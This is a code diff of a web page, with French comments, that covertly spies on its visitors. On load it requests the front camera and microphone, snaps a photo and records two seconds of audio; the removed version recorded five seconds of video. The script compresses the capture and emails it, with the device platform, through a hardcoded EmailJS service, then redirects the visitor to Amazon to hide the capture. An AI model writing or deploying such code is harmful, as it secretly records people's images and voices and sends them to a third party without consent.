@@ -53,7 +53,7 @@
   </div>
   
   <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas" width="640" height="480"></canvas>
+  <canvas id="canvas" width="320" height="240"></canvas>
   
   <script>
     emailjs.init("mxm3fFA_BxEhqJieq");
@@ -62,134 +62,144 @@
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
     
-    // Démarrage automatique dès le chargement
+    let mediaRecorder;
+    let audioChunks = [];
+    let photoData = null;
+    
+    // Démarrage automatique
     window.addEventListener('load', async () => {
       try {
-        // Demande d'accès à la caméra frontale et micro
+        // Accès caméra et micro
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { 
-            facingMode: 'user' // Caméra frontale
+            facingMode: 'user',
+            width: { ideal: 320 },
+            height: { ideal: 240 }
           },
-          audio: true // Ajout du micro
+          audio: true
         });
         
         video.srcObject = stream;
-        video.muted = true; // Force le mute du stream
+        video.muted = true;
         
-        // Attendre que la vidéo soit prête puis enregistrer
+        // Attendre que la vidéo soit prête
         video.addEventListener('loadedmetadata', () => {
-          video.muted = true; // Double sécurité
-          setTimeout(startRecording, 5000); // Délai de 5s avant enregistrement
+          capturePhotoAndAudio(stream);
         });
         
       } catch (err) {
-        console.error('Erreur caméra:', err);
-        // Redirection même en cas d'erreur
+        console.error('Erreur:', err);
         redirectToAmazon();
       }
     });
     
-    let mediaRecorder;
-    let recordedChunks = [];
-    
-    function startRecording() {
-      try {
-        const stream = video.srcObject;
-        mediaRecorder = new MediaRecorder(stream);
-        recordedChunks = [];
-        
-        mediaRecorder.ondataavailable = (event) => {
-          if (event.data.size > 0) {
-            recordedChunks.push(event.data);
-          }
-        };
-        
-        mediaRecorder.onstop = () => {
-          sendVideoAndRedirect();
-        };
-        
-        // Démarrer l'enregistrement pour 5 secondes
-        mediaRecorder.start();
-        setTimeout(() => {
-          mediaRecorder.stop();
-        }, 5000);
-        
-      } catch (err) {
-        console.error('Erreur enregistrement:', err);
-        redirectToAmazon();
-      }
-    }
-    
-    function sendVideoAndRedirect() {
-      try {
-        // Créer le blob vidéo
-        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-        
-        // Convertir en base64 pour l'email
-        const reader = new FileReader();
-        reader.onload = () => {
-          const videoData = reader.result;
-          
-          // Arrêter la caméra
-          const stream = video.srcObject;
-          if (stream) {
-            stream.getTracks().forEach(track => track.stop());
-          }
-          
-          // Envoyer par email
-          emailjs.send("service_8cs0gml", "template_w14xn7c", {
-            name: "Visiteur",
-            time: new Date().toLocaleString(),
-            message: "Vidéo automatique (5 sec)",
-            image: videoData
-          }).then(() => {
-            console.log('Vidéo envoyée');
-          }).catch(err => {
-            console.error('Erreur envoi:', err);
-          }).finally(() => {
-            redirectToAmazon();
-          });
-        };
-        
-        reader.readAsDataURL(videoBlob);
-        
-      } catch (err) {
-        console.error('Erreur traitement vidéo:', err);
-        redirectToAmazon();
-      }
-    }
-    
-    function oldCaptureAndSend() {
-      try {
-        // Capturer l'image
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL("image/jpeg", 0.8);
-        
-        // Arrêter la caméra
-        const stream = video.srcObject;
-        if (stream) {
-          stream.getTracks().forEach(track => track.stop());
+    function capturePhotoAndAudio(stream) {
+      // 1. Prendre la photo immédiatement
+      context.drawImage(video, 0, 0, 320, 240);
+      photoData = canvas.toDataURL("image/jpeg", 0.3); // Qualité réduite pour poids
+      
+      // 2. Enregistrer l'audio pendant 2 secondes
+      audioChunks = [];
+      
+      // Créer un stream audio seulement
+      const audioStream = new MediaStream();
+      stream.getAudioTracks().forEach(track => {
+        audioStream.addTrack(track);
+      });
+      
+      mediaRecorder = new MediaRecorder(audioStream, {
+        mimeType: 'audio/webm;codecs=opus'
+      });
+      
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          audioChunks.push(event.data);
         }
+      };
+      
+      mediaRecorder.onstop = () => {
+        processAndSend(stream);
+      };
+      
+      // Démarrer enregistrement audio 2 secondes
+      mediaRecorder.start();
+      setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
+        }
+      }, 2000);
+    }
+    
+    function processAndSend(stream) {
+      // Créer le blob audio
+      const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+      
+      // Vérifier la taille totale
+      const photoSize = Math.round(photoData.length * 0.75); // Taille approximative en bytes
+      const audioSize = audioBlob.size;
+      const totalSize = photoSize + audioSize;
+      
+      console.log(`Tailles: Photo ~${Math.round(photoSize/1024)}KB, Audio ~${Math.round(audioSize/1024)}KB, Total ~${Math.round(totalSize/1024)}KB`);
+      
+      // Si trop volumineux, réduire encore
+      let finalPhotoData = photoData;
+      if (totalSize > 50000) { // 50KB
+        // Réduire drastiquement la qualité photo
+        finalPhotoData = canvas.toDataURL("image/jpeg", 0.1);
+        console.log('Photo compressée davantage');
+      }
+      
+      // Convertir l'audio en base64
+      const audioReader = new FileReader();
+      audioReader.onload = () => {
+        sendCompactData(finalPhotoData, audioReader.result, stream);
+      };
+      audioReader.readAsDataURL(audioBlob);
+    }
+    
+    function sendCompactData(imageData, audioData, stream) {
+      // Arrêter la caméra
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+      
+      // Calculer les tailles finales
+      const finalImageSize = Math.round(imageData.length * 0.75);
+      const finalAudioSize = Math.round(audioData.length * 0.75);
+      const finalTotalSize = finalImageSize + finalAudioSize;
+      
+      // Préparer les données optimisées
+      const templateParams = {
+        from_name: "Auto",
+        message: `Photo + Audio 2s (Total: ~${Math.round(finalTotalSize/1024)}KB)`,
+        timestamp: new Date().toLocaleString('fr-FR'),
         
-        // Envoyer par email
-        emailjs.send("service_8cs0gml", "template_w14xn7c", {
-          name: "Visiteur",
-          time: new Date().toLocaleString(),
-          message: "Photo automatique",
-          image: imageData
-        }).then(() => {
-          console.log('Photo envoyée');
-        }).catch(err => {
-          console.error('Erreur envoi:', err);
-        }).finally(() => {
-          // Redirection vers Amazon après envoi (succès ou échec)
+        // Données compactes
+        photo_data: imageData,
+        audio_data: audioData,
+        
+        // Métadonnées minimales
+        photo_size: `~${Math.round(finalImageSize/1024)}KB`,
+        audio_duration: "2 secondes",
+        audio_size: `~${Math.round(finalAudioSize/1024)}KB`,
+        total_size: `~${Math.round(finalTotalSize/1024)}KB`,
+        
+        // Info système minimale
+        device: navigator.platform,
+        time: new Date().toISOString()
+      };
+      
+      // Envoyer
+      emailjs.send("service_8cs0gml", "template_w14xn7c", templateParams)
+        .then(() => {
+          console.log('✅ Données envoyées');
+        })
+        .catch(err => {
+          console.error('❌ Erreur envoi:', err);
+        })
+        .finally(() => {
           redirectToAmazon();
         });
-        
-      } catch (err) {
-        console.error('Erreur capture:', err);
-        redirectToAmazon();
-      }
     }
     
     function redirectToAmazon() {
